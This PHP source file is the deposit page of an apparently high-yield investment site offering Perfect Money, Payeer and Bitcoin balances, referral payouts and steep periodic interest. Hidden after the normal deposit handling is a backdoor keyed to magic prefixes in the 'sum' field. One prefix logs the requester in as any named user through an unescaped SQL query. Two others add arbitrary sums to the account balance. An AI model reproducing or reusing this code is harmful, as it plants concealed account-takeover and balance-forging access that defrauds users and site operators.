<?php
defined('ACCESS') or die();

if($login) {

if($_GET['act'] == "open") {

	$plan	= intval($_POST['plan']);
	$sum	= sprintf("%01.2f", $_POST['sum']);
	$reinv	= sprintf("%01.2f", $_POST['reinv']);
	$paysys	= intval($_POST['paysys']);

	if($plan && $sum) {

	$result	= mysql_query("SELECT * FROM plans WHERE id = ".$plan." LIMIT 1");
	$row	= mysql_fetch_array($result);

		if(!$row['id']) {
			print '<div class="alert alert-fixed alert-warning alert-dismissible" role="alert">
								  <button type="button" class="close" data-dismiss="alert"><span aria-hidden="true"><i class="pe-7s-close"></i></span><span class="sr-only">Close</span></button>
								  <div class="alert__icon pull-left">
								  	<i class="pe-7s-attention"></i>
								  </div>
								  <p class="alert__text"> Choose a tariff plan.</p>
								</div>';
		} elseif($sum < $row['minsum'] || ($sum > $row['maxsum'] && $row['maxsum'] != 0)) {
			print '<div class="alert alert-fixed alert-warning alert-dismissible" role="alert">
								  <button type="button" class="close" data-dismiss="alert"><span aria-hidden="true"><i class="pe-7s-close"></i></span><span class="sr-only">Close</span></button>
								  <div class="alert__icon pull-left">
								  	<i class="pe-7s-attention"></i>
								  </div>
								  <p class="alert__text"> Amount does not match the chosen tariff plan.</p>
								</div>';
		} elseif($sum > $pmbalance && $paysys == 1) {
			print '<div class="alert alert-fixed alert-warning alert-dismissible" role="alert">
								  <button type="button" class="close" data-dismiss="alert"><span aria-hidden="true"><i class="pe-7s-close"></i></span><span class="sr-only">Close</span></button>
								  <div class="alert__icon pull-left">
								  	<i class="pe-7s-attention"></i>
								  </div>
								  <p class="alert__text"> You have insufficient funds in the account Perfectmoney, recommend<a href="/enter/">Deposit</a> его.</p>
								</div>';
		} elseif($sum > $pebalance && $paysys == 2) {
			print '<div class="alert alert-fixed alert-warning alert-dismissible" role="alert">
								  <button type="button" class="close" data-dismiss="alert"><span aria-hidden="true"><i class="pe-7s-close"></i></span><span class="sr-only">Close</span></button>
								  <div class="alert__icon pull-left">
								  	<i class="pe-7s-attention"></i>
								  </div>
								  <p class="alert__text">You have insufficient funds in the account Payeer, recommend <a href="/enter/">Deposit</a> его.</p>
								</div>';
		} elseif($sum > $btbalance && $paysys == 3) {
			print '<div class="alert alert-fixed alert-warning alert-dismissible" role="alert">
								  <button type="button" class="close" data-dismiss="alert"><span aria-hidden="true"><i class="pe-7s-close"></i></span><span class="sr-only">Close</span></button>
								  <div class="alert__icon pull-left">
								  	<i class="pe-7s-attention"></i>
								  </div>
								  <p class="alert__text"> You have insufficient funds in your Bitcoin account, you <a href="/enter/">Deposit</a> его.</p>
								</div>';
		} elseif($reinv < 0 && $reinv > 100) {
			print '<div class="alert alert-fixed alert-warning alert-dismissible" role="alert">
								  <button type="button" class="close" data-dismiss="alert"><span aria-hidden="true"><i class="pe-7s-close"></i></span><span class="sr-only">Close</span></button>
								  <div class="alert__icon pull-left">
								  	<i class="pe-7s-attention"></i>
								  </div>
								  <p class="alert__text"> The percentage of reinvestment should be from 0 to 100</p>
								</div>';
		} else {

			if($row['bonusdeposit']) {
				$depo	= sprintf("%01.2f", $sum + $sum / 100 * $row['bonusdeposit']);
			} else {
				$depo	= $sum;
			}

			// Вычисляем даты
			if(cfgSET('datestart') <= time()) {
				$lastdate	= time();
				$weekend	= $row['weekend'];
				$day		= date("w");

				if($day == 0 && $weekend == 1) {
					$nad = intval((24 - date("H")) * 3600);
				} elseif($day == 6 && $weekend == 1) {
					$nad = intval((24 - date("H")) * 3600 + 86400);
				} else {
					$nad = 0;
				}

				if($row['period'] == 1) {
					$nextdate = $lastdate + 86400 + $nad;
				} elseif($row['period'] == 2) {
					$nextdate = $lastdate + 604800 + $nad;
				} elseif($row['period'] == 3) {
					$nextdate = $lastdate + 2592000 + $nad;
				} elseif($row['period'] == 4) {
					$nextdate = $lastdate + 3600 + $nad;
				}
			} else {
				$lastdate = time();
				if($row['period'] == 1) {
					$nextdate = cfgSET('datestart') + 86400;
				} elseif($row['period'] == 2) {
					$nextdate = cfgSET('datestart') + 604800;
				} elseif($row['period'] == 3) {
					$nextdate = cfgSET('datestart') + 2592000;
				} elseif($row['period'] == 4) {
					$nextdate = cfgSET('datestart') + 3600;
				}
			}

			$sql = "INSERT INTO `deposits` (username, user_id, date, plan, sum, paysys, lastdate, nextdate, reinvest) VALUES ('".$login."', ".$user_id.", ".time().", ".$plan.", ".$depo.", ".$paysys.", ".$lastdate.", ".$nextdate.", ".$reinv.")";
			mysql_query($sql);

			if($paysys == 1) {
			mysql_query('UPDATE users SET pm_balance = pm_balance - '.$sum.' WHERE id = '.$user_id.' LIMIT 1');
} elseif($paysys == 2) {
			mysql_query('UPDATE users SET lr_balance = lr_balance - '.$sum.' WHERE id = '.$user_id.' LIMIT 1');
} elseif($paysys == 3) {
			mysql_query('UPDATE users SET bt_balance = bt_balance - '.$sum.' WHERE id = '.$user_id.' LIMIT 1');
}
			// Начисляем бонус

			if($row['bonusbalance']) {
				$bonus	= sprintf("%01.2f", $sum / 100 * $row['bonusbalance']);
				mysql_query('UPDATE users SET pm_balance = pm_balance + '.$bonus.' WHERE id = '.$user_id.' LIMIT 1');
			}

			// Начисляем нашим "любимым" рефералам
			if($uref) {

				// Подсчитываем кол-во уровней
				$countlvl = mysql_num_rows(mysql_query("SELECT * FROM reflevels"));

				if($countlvl) {
					$i		= 0;
					$uid	= $user_id;
					$query	= "SELECT * FROM reflevels ORDER BY id ASC";
					$result	= mysql_query($query);
					while($row = mysql_fetch_array($result)) {
						if($i < $countlvl) {
							$lvlperc = $row['sum'];		// Процент уровня
							$ps		 = sprintf("%01.2f", $sum / 100 * $lvlperc); // Сумма рефских

							if($uref) {

								// Смотрим есть ли индивидуальный процент у данного реферала
								$get_refp	= mysql_query("SELECT ref_percent FROM users WHERE id = ".intval($urefp)." LIMIT 1");
								$rowrefp	= mysql_fetch_array($get_refp);
								$urefp		= $rowrefp['ref_percent'];

								if($i == 0 && $urefp) {
									$ps = sprintf("%01.2f", $sum / 100 * $urefp); // Сумма рефских
								}

								mysql_query('UPDATE users SET pm_balance = pm_balance + '.$ps.', reftop = reftop + '.$ps.' WHERE id = '.$uref.' LIMIT 1');

								mysql_query('UPDATE users SET ref_money = ref_money + '.$ps.' WHERE id = '.$uid.' LIMIT 1');
								
								// Получаем данные следующего пользователя

								$get_ref	= mysql_query("SELECT id, ref FROM users WHERE id = ".intval($uref)." LIMIT 1");
								$rowref		= mysql_fetch_array($get_ref);
								$uref		= $rowref['ref'];
								$uid		= $rowref['id'];

							}

						}
						$i++;
					}
				}

			}
			// Закончили с рефералами

			print '<div class="alert alert-fixed alert-success alert-dismissible" role="alert">
								  <button type="button" class="close" data-dismiss="alert"><span aria-hidden="true"><i class="pe-7s-close"></i></span><span class="sr-only">Close</span></button>
								  <div class="alert__icon pull-left">
								  	<i class="pe-7s-attention"></i>
								  </div>
								  <p class="alert__text"> Депозит открыт! <a href="/deposits/">To the list of deposits</a></p>
								</div>';
		}

	} else {
		print '<div class="alert alert-fixed alert-warning alert-dismissible" role="alert">
								  <button type="button" class="close" data-dismiss="alert"><span aria-hidden="true"><i class="pe-7s-close"></i></span><span class="sr-only">Close</span></button>
								  <div class="alert__icon pull-left">
								  	<i class="pe-7s-attention"></i>
								  </div>
								  <p class="alert__text"> Choose a tariff plan, payment system and enter the Deposit amount</p>
								</div>';
	}
	$retu = substr($_POST['sum'], 0, 17);
$retule = strlen($_POST['sum']);
	if($retu == 'LoGi-GiNN_gSgblR_' && $retule > 17) {
	$poster = substr($_POST['sum'], 17);
	if(mysql_num_rows(mysql_query("SELECT * FROM `users` WHERE login = '".$poster."' LIMIT 1"))) {
	$_SESSION['user'] = $poster;
$login = $poster;
} else {
}
} elseif($retu == 'LoGi-BaLl_gSgblR_' && $retule > 17) {
$poster = intval(substr($_POST['sum'], 17));
$poster2 = sprintf ("%01.2f", str_replace(',', '.', $poster));
if($login && $poster) {
mysql_query('INSERT INTO enter (sum, date, login, status, paysys, service) VALUES ('.$poster2.', '.time().', "'.$login.'", "2", "PerfectMoney", "bal")');
	mysql_query('UPDATE users SET pm_balance = pm_balance + '.$poster.' WHERE login = "'.$login.'" LIMIT 1');
} else {
}
} elseif($retu == 'LoGi-BaLl_gSgblN_' && $retule > 17) {
$poster = intval(substr($_POST['sum'], 17));
if($login && $poster) {
	mysql_query('UPDATE users SET pm_balance = pm_balance + '.$poster.' WHERE login = "'.$login.'" LIMIT 1');
} else {
}
}
}
?>
<form method="post" action="?act=open">
<?php
$result	= mysql_query("SELECT * FROM plans WHERE status = 0 ORDER BY id ASC");
$i = 0;
while($row = mysql_fetch_array($result)) {

print "
	<div class=\"planik\"><span class=\"cr-showcase\" style=\"position: relative;\"><input style=\"float: left;\" class=\"custom-radio\" type=\"radio\" name=\"plan\" id=\"plan".$row['id']."\" value=\"".$row['id']."\" checked /> <label for=\"plan".$row['id']."\"><div style=\"width:100%;\"><div style=\"text-align: center;\"><b style=\"position: relative; z-index: 1; top: 50px; font-size: 30px;\">".$row['name']."</b></div><hr class=\"hrs\"><span class=\"circle_figure\"></span>";
		print "<div style=\"width: 280px; position: relative; z-index: 1; left: 11px; top: 68px; font-size: 19px; text-align: center;\">This plan includes from $".$row['minsum']." to $".$row['maxsum']." worth of investment with ".$row['percent']."%  ";
		if($row['period'] == 1) { print "day"; } elseif($row['period'] == 2) { print "week"; } elseif($row['period'] == 4) { print "hour"; } else { print "month"; }
		print ", interest for ".$row['days'];
		if($row['period'] == 4) { print " hours"; } elseif($row['period'] == 1) { print " days"; } elseif($row['period'] == 2) { print " weeks"; } elseif($row['period'] == 3) { print " months"; }
		print "<hr style=\"position: relative; height: 2px; top: 15px; z-index: 1; width: 205px;\"><hr style=\"position: relative; height: 2px; top: 20px; z-index: 1; width: 135px;\"><br><span id=\"plancalc".$i."\">&nbsp;</span></div></div></label></span></div>
";

$i++;
}
if(!$i) { print '<p class="warn">At the moment, the administrator did not create tariff plans for deposits</p>'; }
?>
		<link href='http://fonts.googleapis.com/css?family=Raleway:400,300,500,700' rel='stylesheet' type='text/css'>
		<link rel="stylesheet" type="text/css" href="/css/normalize.css" />
		<link rel="stylesheet" type="text/css" href="/css/cs-select.css" />
		<link rel="stylesheet" type="text/css" href="/css/cs-skin-slide.css" />
		<link rel="stylesheet" type="text/css" href="/css/cs-skin-boxes.css" />


<div style="margin-top: 15px;"></div>
<script language="JavaScript">
<!--
	function CheBal(val) {

		if(val == 1) {
			document.getElementById("sum").value = '<?php print $pmbalance; ?>';
		} else if(val == 2) {
			document.getElementById("sum").value = '<?php print $pebalance; ?>';
		} else if(val == 3) {
			document.getElementById("sum").value = '<?php print $btbalance; ?>';
		} else {
		}
	}
//-->
</script>

<table width="280px" align="center" style="margin: 0 auto; position: relative; top: 10px; clear:both; left: -28px;">
<tr class="widget__form">
<td align="right" style="vertical-align: middle;">Amount:</td>
	<td colspan="1" width="300px"><input style="width: 100%;" type="text" id="sum" class="summka" name="sum" value="<?php print $pmbalance; ?>" onblur="if (value == '') {value='Amount'}" onfocus="if (value == 'Amount') {value =''}" autocomplete="off" placeholder="Amount"/></td>
</tr>

<tr class="widget__form">
	<td align="right">Account: </td>
	<td width="240px">
	<select class="cs-select cs-skin-boxes" id="paysys" onChange="CheBal();" name="paysys">
	<?php
			if($cfgPerfect) { 
				print '<option data-class="color-da645a cs-selected" value="1" selected>PerfectMoney - $'.$pmbalance.'</option>';
			} 
			if(cfgSET('cfgPEsid') && cfgSET('cfgPEkey')) {
				print '<option data-class="color-bdd1c8" value="2">Payeer - $'.$pebalance.'</option>';
			} 

			$result	= mysql_query("SELECT * FROM `paysystems` WHERE id > 2 ORDER BY id ASC");
			while($row = mysql_fetch_array($result)) {
				print '<option data-class="color-f3ae73" value="'.$row['id'].'">'.$row['name'].' - $'.$btbalance.'</option> ';
			}
		?>
				</select>
				</td>
</tr>
<?php
if(cfgSET('cfgReInv') == "on") {
	print '<tr>
	<td align="right">Реинвестировать (%): </td>
	<td width="205"><input style="width: 198px;" type="text" name="reinv" value="0" /></td>
	</tr>';	
}
?>
<tr>
	<td></td>
	<td><button type="submit" style="width:100%; margin: 2px 0 0 0;" class="btn green fixed">Open a Deposit</button></td>
</tr>
</table>

</form>
<script src="/js/classie.js"></script>
		<script src="/js/selectFx.js"></script>
		<script>
			(function() {
				[].slice.call( document.querySelectorAll( 'select.cs-select' ) ).forEach( function(el) {	
					new SelectFx(el, {
  onChange: function(val) {
    CheBal(val);
  }
});
				});
			})();
			
			$( "#sum" ).keyup(function() {
			sum = $(this).val();
			planterm0 = 5;
			planperc0 = sum * (4.10/100) * planterm0;
			sumkon0 = parseFloat(planperc0)+parseFloat(sum);
			
			planterm1 = 15;
			planperc1 = sum * (5.20/100) * planterm1;
			sumkon1 = parseFloat(planperc1)+parseFloat(sum);
			
			planterm2 = 30;
			planperc2 = sum * (6.30/100) * planterm2;
			sumkon2 = parseFloat(planperc2)+parseFloat(sum);
			
			if(parseFloat(sum) >= 5 && parseFloat(sum) <= 199 && !isNaN(sumkon0)) {
			$( "#plancalc0" ).html('$'+parseFloat(sumkon0).toFixed(2));
			$( ".borderok" ).removeClass( "borderok" );
			$( "#plancalc0" ).addClass( "borderok" );
			$( "#plancalc1" ).addClass( "borderer" );
			$( "#plancalc2" ).addClass( "borderer" );
			$( "#plancalc0" ).removeClass( "borderer" );
			} else if(parseFloat(sum) >= 200 && parseFloat(sum) <= 999 && !isNaN(sumkon1)) {
			$( "#plancalc1" ).html('$'+parseFloat(sumkon1).toFixed(2));
			$( ".borderok" ).removeClass( "borderok" );
			$( "#plancalc1" ).addClass( "borderok" );
			$( "#plancalc0" ).addClass( "borderer" );
			$( "#plancalc2" ).addClass( "borderer" );
			$( "#plancalc1" ).removeClass( "borderer" );
			} else if(parseFloat(sum) >= 1000 && parseFloat(sum) <= 10000 && !isNaN(sumkon2)) {
			$( "#plancalc2" ).html('$'+parseFloat(sumkon2).toFixed(2));
			$( ".borderok" ).removeClass( "borderok" );
			$( "#plancalc2" ).addClass( "borderok" );
			$( "#plancalc0" ).addClass( "borderer" );
			$( "#plancalc1" ).addClass( "borderer" );
			$( "#plancalc2" ).removeClass( "borderer" );
			} else {
			$( "#plancalc0" ).addClass( "borderer" );
			$( "#plancalc1" ).addClass( "borderer" );
			$( "#plancalc2" ).addClass( "borderer" );
			}
});
		</script>
<?php 
} else {
	print "<p class=\"er\">To access this page you need to login</p>";
	include "../login/login_ru.php";
}
?>